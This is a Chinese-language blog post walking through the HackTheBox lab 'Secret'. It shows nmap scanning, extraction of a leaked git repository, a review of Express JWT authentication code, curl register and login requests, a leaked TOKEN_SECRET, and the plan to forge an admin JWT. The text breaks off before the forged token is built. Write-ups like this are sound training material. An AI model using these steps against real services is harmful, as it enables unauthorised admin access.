<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Secret - Hackthebox | Lucifiel&#39;s Blog | Lucifiel ÊäÄÊúØÂçöÂÆ¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - SecretÈù∂Âú∫‰ø°ÊÅØ  Èù∂Âú∫Á±ªÂûã  ‰ø°ÊÅØÊêúÈõÜÈ¶ñÂÖàËøõË°åÁ´ØÂè£Êâ´Êèè ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~&#x2F;Desktop] ‚îî‚îÄ# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-08 02:09 EST Nmap sc">
<meta property="og:type" content="article">
<meta property="og:title" content="Secret - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - SecretÈù∂Âú∫‰ø°ÊÅØ  Èù∂Âú∫Á±ªÂûã  ‰ø°ÊÅØÊêúÈõÜÈ¶ñÂÖàËøõË°åÁ´ØÂè£Êâ´Êèè ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~&#x2F;Desktop] ‚îî‚îÄ# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-08 02:09 EST Nmap sc">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image1.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image2.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image3.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image6.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image7.png">
<meta property="article:published_time" content="2021-12-06T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:50:21.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image1.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ‰∏ªÈ°µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Secret - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="ËæìÂÖ•ÊÑüÂÖ¥Ë∂£ÁöÑÂÖ≥ÈîÆÂ≠ó">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Secret - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-12-06T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-12-06
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Secret"><span class="post-toc-text">Hackthebox - Secret</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Èù∂Âú∫‰ø°ÊÅØ"><span class="post-toc-text">Èù∂Âú∫‰ø°ÊÅØ</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Èù∂Âú∫Á±ªÂûã"><span class="post-toc-text">Èù∂Âú∫Á±ªÂûã</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#‰ø°ÊÅØÊêúÈõÜ"><span class="post-toc-text">‰ø°ÊÅØÊêúÈõÜ</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Âú®Á∫øÂ∑•ÂÖ∑"><span class="post-toc-text">Âú®Á∫øÂ∑•ÂÖ∑</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-Tools"><span class="post-toc-text">JWT_Tools</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ÊºèÊ¥ûÂà©Áî®"><span class="post-toc-text">ÊºèÊ¥ûÂà©Áî®</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ÊùÉÈôêÊèêÂçá"><span class="post-toc-text">ÊùÉÈôêÊèêÂçá</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell-1"><span class="post-toc-text">Shell 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell-2"><span class="post-toc-text">Shell 2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell-1-Á¨¨‰∫åÊ¨°"><span class="post-toc-text">Shell 1 Á¨¨‰∫åÊ¨°</span></a></li></ol></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Secret"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Secret - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-12-06 19:38:36" datetime="2021-12-06T11:38:36.000Z"  itemprop="datePublished">2021-12-06</time>

            


            
<span id="busuanzi_container_page_pv" title="ÊñáÁ´†ÊÄªÈòÖËØªÈáè" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Secret"><a href="#Hackthebox-Secret" class="headerlink" title="Hackthebox - Secret"></a>Hackthebox - Secret</h1><h2 id="Èù∂Âú∫‰ø°ÊÅØ"><a href="#Èù∂Âú∫‰ø°ÊÅØ" class="headerlink" title="Èù∂Âú∫‰ø°ÊÅØ"></a><strong>Èù∂Âú∫‰ø°ÊÅØ</strong></h2><img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image1.png" class>

<h2 id="Èù∂Âú∫Á±ªÂûã"><a href="#Èù∂Âú∫Á±ªÂûã" class="headerlink" title="Èù∂Âú∫Á±ªÂûã"></a><strong>Èù∂Âú∫Á±ªÂûã</strong></h2><img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image2.png" class>

<h2 id="‰ø°ÊÅØÊêúÈõÜ"><a href="#‰ø°ÊÅØÊêúÈõÜ" class="headerlink" title="‰ø°ÊÅØÊêúÈõÜ"></a><strong>‰ø°ÊÅØÊêúÈõÜ</strong></h2><p>È¶ñÂÖàËøõË°åÁ´ØÂè£Êâ´Êèè</p>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop]
‚îî‚îÄ# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 02:09 EST
Nmap scan report for 10.10.11.120
Host is up (0.40s latency).
Not shown: 65532 closed ports
PORT ¬† ¬† STATE SERVICE VERSION
22/tcp ¬† open  ssh ¬† ¬† OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| ¬† 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| ¬† 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp ¬† open  http ¬†  nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http ¬†  Node.js (Express middleware)
|_http-title: DUMB Docs
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=11/8%OT=22%CT=1%CU=33102%PV=Y%DS=2%DC=T%G=Y%TM=6188CD7
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT ¬† ¬† ¬† ADDRESS
1 ¬† 851.60 ms 10.10.14.1
2 ¬† 713.96 ms 10.10.11.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.73 seconds
</code></pre>
<p>ÁªèËøáÊü•ÁúãÂêéÂèëÁé∞<code>80</code>Á´ØÂè£Âíå<code>3000</code>Á´ØÂè£ÂÜÖÂÆπ‰∏ÄËá¥</p>
<p>Âí±‰ª¨ÂéªÁúãÁúã<code>80</code>Á´ØÂè£ÁöÑÂÜÖÂÆπ</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image3.png" class>

<p>ËøôÂ•ΩÂÉèÊòØ‰∏Ä‰∏™Êñá‰ª∂ÁÆ°ÁêÜÊúçÂä°Âô®‰πãÁ±ªÁöÑ‰ªÄ‰πà‰∏úË•øÁöÑÔºüÂí±Ëã±Êñá‰∏çÂ•ΩÔºåÂí±‰πü‰∏çÁü•ÈÅìÔºåÂí±‰πü‰∏çÊï¢ÈóÆ</p>
<p>Âè≥‰∏äËßíÊúâ‰∏™ÊåâÈíÆ<code>Live Demo</code>ÔºåÂèçÊ≠£ÁÇπ‰∫Ü‰πü‰∏ç‰ºöÁàÜÁÇ∏ÔºåÁÇπÁÇπÁúãÂëó</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image4.png" class>

<p>ËøôÊòØAPIÊé•Âè£ÂïäÔºå‰ΩÜÊòØÂ•ΩÂÉèÊ≤°ÊúâÂÜÖÂÆπÔºåÂí±‰ª¨ÂæÄ‰∏ãÁúãÁúã</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image5.png" class>

<p>ËøôÈáåÂ•ΩÂÉèÊòØÂèØ‰ª•‰∏ãËΩΩÊ∫ê‰ª£Á†ÅÔºåÁÆ°‰ªñÁöÑÂÖà‰∏ãËΩΩ‰∏ãÊù•ÁúãÁúãÂëó</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image6.png" class>

<p>ËøôÂ∫îËØ•ÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÈ°πÁõÆÔºåÁÑ∂ÂêéËøòÊúâgitÊñá‰ª∂Ê≥ÑÈú≤ÔºåÈÇ£Â∞±ÂÖà‰∏ãËΩΩ‰∏ãÊù•Âòõ</p>
<blockquote>
<p><a href="https://github.com/LucifielHack/GitTools" target="_blank" rel="noopener">https://github.com/LucifielHack/GitTools</a></p>
</blockquote>
<p>‰∏ãËΩΩ‰∏ãÊù•ÂêéÂà©Áî®‰∏Ä‰∏ã</p>
<pre><code class="Plain">/root/Desktop/GitTools/Extractor/extractor.sh local-web/ dump
</code></pre>
<p>ÂÜÖÂÆπÊØîËæÉÂ§öÔºåÂí±‰ª¨Á≠â‰ªñÂÖà‰∏ãËΩΩÂÆåÂêßÔºåÁ≠âÁöÑÊó∂ÂÄôÂèØ‰ª•ÂéªÁúã‰ºöÂÑøËßÜÈ¢ë</p>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/dump]
‚îî‚îÄ# ls -la
ÊÄªÁî®Èáè 32
drwxr-xr-x 8 root root 4096 11Êúà 29 20:53 .
drwxr-xr-x 6 root root 4096 11Êúà 29 20:47 ..
drwxr-xr-x 7 root root 4096 11Êúà 29 20:48 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
drwxr-xr-x 7 root root 4096 11Êúà 29 20:50 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
drwxr-xr-x 7 root root 4096 11Êúà 29 20:51 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
drwxr-xr-x 7 root root 4096 11Êúà 29 20:52 3-de0a46b5107a2f4d26e348303e76d85ae4870934
drwxr-xr-x 7 root root 4096 11Êúà 29 20:53 4-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
drwxr-xr-x 7 root root 4096 11Êúà 29 20:54 5-3a367e735ee76569664bf7754eaaade7c735d702
</code></pre>
<p>ÂÆåÊàêÂêéÂèØ‰ª•ÁúãÂà∞ÊúâÊèêÂèñÂá∫ÂÖ≠Ê¨°Êï∞ÊçÆÔºåÂí±‰ª¨Èöè‰æøËøõ‰∏Ä‰∏™ÁúãÁúã</p>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]
‚îî‚îÄ# ls -la
ÊÄªÁî®Èáè 116
drwxr-xr-x ¬† 7 root root  4096 11Êúà 29 20:48 .
drwxr-xr-x ¬† 8 root root  4096 11Êúà 29 20:53 ..
-rw-r--r-- ¬† 1 root root ¬† 219 11Êúà 29 20:47 commit-meta.txt
-rw-r--r-- ¬† 1 root root ¬† 174 11Êúà 29 20:47 .env
-rw-r--r-- ¬† 1 root root ¬† 885 11Êúà 29 20:47 index.js
drwxr-xr-x ¬† 2 root root  4096 11Êúà 29 20:47 model
drwxr-xr-x 201 root root  4096 11Êúà 29 20:48 node_modules
-rw-r--r-- ¬† 1 root root ¬† 491 11Êúà 29 20:48 package.json
-rw-r--r-- ¬† 1 root root 69452 11Êúà 29 20:48 package-lock.json
drwxr-xr-x ¬† 3 root root  4096 11Êúà 29 20:48 public
drwxr-xr-x ¬† 2 root root  4096 11Êúà 29 20:48 routes
drwxr-xr-x ¬† 4 root root  4096 11Êúà 29 20:48 src
-rw-r--r-- ¬† 1 root root ¬† 651 11Êúà 29 20:48 validations.js
</code></pre>
<p>ÂèØ‰ª•Á°ÆÂÆöÊòØ‰∏Ä‰∏™Ê∫êÁ†ÅÂ∫ì‰∫ÜÔºåÁ™ÅÁ†¥Âè£Âú®<code>/routes/auto.js</code>‰∏≠</p>
<pre><code class="Plain">const router = require(&#39;express&#39;).Router();
const User = require(&#39;../model/user&#39;);
const bcrypt = require(&#39;bcryptjs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)
const { registerValidation, loginValidation} = require(&#39;../validations&#39;)

router.post(&#39;/register&#39;, async (req, res) =&gt; {

 ¬†  // validation
 ¬†  const { error } = registerValidation(req.body)
 ¬†  if (error) return res.status(400).send(error.details[0].message);

 ¬†  // check if user exists
 ¬†  const emailExist = await User.findOne({email:req.body.email})
 ¬†  if (emailExist) return res.status(400).send(&#39;Email already Exist&#39;)

 ¬†  // check if user name exist
 ¬†  const unameexist = await User.findOne({ name: req.body.name })
 ¬†  if (unameexist) return res.status(400).send(&#39;Name already Exist&#39;)

 ¬†  //hash the password
 ¬†  const salt = await bcrypt.genSalt(10);
 ¬†  const hashPaswrod = await bcrypt.hash(req.body.password, salt)

 ¬†  //create a user
 ¬†  const user = new User({
 ¬† ¬† ¬†  name: req.body.name,
 ¬† ¬† ¬†  email: req.body.email,
 ¬† ¬† ¬†  password:hashPaswrod
 ¬†  });

 ¬†  try{
 ¬† ¬† ¬†  const saveduser = await user.save();
 ¬† ¬† ¬†  res.send({ user: user.name})

 ¬†  }
 ¬†  catch(err){
 ¬† ¬† ¬†  console.log(err)
 ¬†  }

});

// login

router.post(&#39;/login&#39;, async  (req , res) =&gt; {

 ¬†  const { error } = loginValidation(req.body)
 ¬†  if (error) return res.status(400).send(error.details[0].message);

 ¬†  // check if email is okay
 ¬†  const user = await User.findOne({ email: req.body.email })
 ¬†  if (!user) return res.status(400).send(&#39;Email is wrong&#39;);

 ¬†  // check password
 ¬†  const validPass = await bcrypt.compare(req.body.password, user.password)
 ¬†  if (!validPass) return res.status(400).send(&#39;Password is wrong&#39;);

 ¬†  // create jwt
 ¬†  const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
 ¬†  res.header(&#39;auth-token&#39;, token).send(token);

})

router.use(function (req, res, next) {
 ¬†  res.json({
 ¬† ¬† ¬†  message: {

 ¬† ¬† ¬† ¬† ¬†  message: &quot;404 page not found&quot;,
 ¬† ¬† ¬† ¬† ¬†  desc: &quot;page you are looking for is not found. &quot;
 ¬† ¬† ¬†  }
 ¬†  })
});

module.exports = router
</code></pre>
<p>ËøôÊòØ<code>auto.js</code> ÂÜÖÁöÑÊ∫êÁ†ÅÔºåÂèØ‰ª•ÁúãÂá∫Êù•Êúâ<code>/register</code>Êù•ËØ∑Ê±ÇÂÆÉ</p>
<p>È¶ñÂÖàÊ∑ªÂä†‰∏Ä‰∏™DNSËß£Êûê</p>
<pre><code class="Plain">echo 10.10.11.120 secret.htb &gt;&gt; /etc/hosts
</code></pre>
<p>ÊûÑÈÄ†‰∏Ä‰∏™payloadÊù•Ê≥®ÂÜåÁî®Êà∑</p>
<pre><code class="Plain">curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/register --data &#39;{&quot;name&quot;: &quot;lucifiel&quot;,&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39;
</code></pre>
<p>ÁÑ∂Âêé‰ΩøÁî®Ê≥®ÂÜåÁöÑÁî®Êà∑ËøõË°åÁôªÂΩï</p>
<pre><code class="Plain">curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/login --data &#39;{&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39;
</code></pre>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]
‚îî‚îÄ# curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/login --data &#39;{&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39;
Note: Unnecessary use of -X or --request, POST is already inferred.
* ¬† Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
&gt; POST /api/user/login HTTP/1.1
&gt; Host: secret.htb
&gt; User-Agent: curl/7.74.0
&gt; Accept: */*
&gt; Content-Type: application/json
&gt; Content-Length: 55
&gt;
* upload completely sent off: 55 out of 55 bytes
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Server: nginx/1.18.0 (Ubuntu)
&lt; Date: Mon, 06 Dec 2021 06:28:56 GMT
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 216
&lt; Connection: keep-alive
&lt; X-Powered-By: Express
&lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM
&lt; ETag: W/&quot;d8-L4wZphXtP/sfJQE0ke71PfuUMnY&quot;
&lt;
* Connection #0 to host secret.htb left intact
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM
</code></pre>
<p>ÊàêÂäüÁôªÂΩïÂπ∂Ëé∑ÂèñÂà∞token</p>
<p>Êü•ÁúãÂπ∂ÂàÜÊûê<code>/routes/verifytoken.js</code>Êñá‰ª∂ÁöÑÂÜÖÂÆπ</p>
<pre><code class="Plain">const jwt = require(&quot;jsonwebtoken&quot;);

module.exports = function (req, res, next) {
 ¬†  const token = req.header(&quot;auth-token&quot;);
 ¬†  if (!token) return res.status(401).send(&quot;Access Denied&quot;);

 ¬†  try {
 ¬† ¬† ¬†  const verified = jwt.verify(token, process.env.TOKEN_SECRET);
 ¬† ¬† ¬†  req.user = verified;
 ¬† ¬† ¬†  next();
 ¬†  } catch (err) {
 ¬† ¬† ¬†  res.status(400).send(&quot;Invalid Token&quot;);
 ¬†  }
};
</code></pre>
<p>Êàë‰ª¨Áü•ÈÅì‰∫ÜJWT‰ª§ÁâåÁöÑÈ™åËØÅËøáÁ®ãÔºåÈÇ£Êàë‰ª¨Â∞±ÊûÑÈÄ†‰∏Ä‰∏™payloadÊü•Áúã‰∏Ä‰∏ãÊàë‰ª¨ÂΩìÂâçÁöÑÊùÉÈôê</p>
<pre><code class="Plain">curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM&#39;
</code></pre>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~]
‚îî‚îÄ# curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM&#39;
{&quot;role&quot;:{&quot;role&quot;:&quot;you are normal user&quot;,&quot;desc&quot;:&quot;lucifiel&quot;}}
</code></pre>
<p>ÂæóÂà∞ÂõûÂåÖÔºåÊàë‰ª¨ÊòØ‰∏Ä‰∏™ÊôÆÈÄöÁî®Êà∑ÊùÉÈôê</p>
<pre><code class="Plain">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]
‚îî‚îÄ# cat .env
DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39;
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
</code></pre>
<p>Êü•ÁúãÊ†πÁõÆÂΩïÁöÑ<code>.env</code>Êñá‰ª∂ÔºåÂæóÂà∞‰∫Ü‰∏ÄÊÆµtokne</p>
<pre><code class="Plain">const router = require(&#39;express&#39;).Router();
const verifytoken = require(&#39;./verifytoken&#39;)
const User = require(&#39;../model/user&#39;);

router.get(&#39;/priv&#39;, verifytoken, (req, res) =&gt; {
 ¬† // res.send(req.user)

 ¬†  const userinfo = { name: req.user }

 ¬†  const name = userinfo.name.name;

 ¬†  if (name == &#39;theadmin&#39;){
 ¬† ¬† ¬†  res.json({
 ¬† ¬† ¬† ¬† ¬†  role:{

 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  role:&quot;you are admin&quot;,
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  desc : &quot;{flag will be here}&quot;
 ¬† ¬† ¬† ¬† ¬†  }
 ¬† ¬† ¬†  })
 ¬†  }
 ¬†  else{
 ¬† ¬† ¬†  res.json({
 ¬† ¬† ¬† ¬† ¬†  role: {
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  role: &quot;you are normal user&quot;,
 ¬† ¬† ¬† ¬† ¬† ¬† ¬†  desc: userinfo.name.name
 ¬† ¬† ¬† ¬† ¬†  }
 ¬† ¬† ¬†  })
 ¬†  }

})

router.use(function (req, res, next) {
 ¬†  res.json({
 ¬† ¬† ¬†  message: {

 ¬† ¬† ¬† ¬† ¬†  message: &quot;404 page not found&quot;,
 ¬† ¬† ¬† ¬† ¬†  desc: &quot;page you are looking for is not found. &quot;
 ¬† ¬† ¬†  }
 ¬†  })
});

module.exports = router
</code></pre>
<p>ÈÄöËøáÊü•Áúãprivate.jsÂæóÁü•È™åËØÅÈÄªËæëÊòØÂè™Ë¶Åname &#x3D; theadmin Â∞±ÊòØadminË¥¶Êà∑ÔºåÈÇ£Êàë‰ª¨Êù•‰º™ÈÄ†‰∏Ä‰∏™JWT‰ª§ÁâåÂç≥ÂèØ</p>
<p>‰ΩøÁî®Âú®Á∫øJWT‰øÆÊîπÂ∑•ÂÖ∑Êàñjwt_toolsËøõË°åJWT‰ª§Áâå‰øÆÊîπÈÉΩÂèØ‰ª•</p>
<blockquote>
<p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
</blockquote>
<blockquote>
<p><a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener">https://github.com/ticarpi/jwt_tool</a></p>
</blockquote>
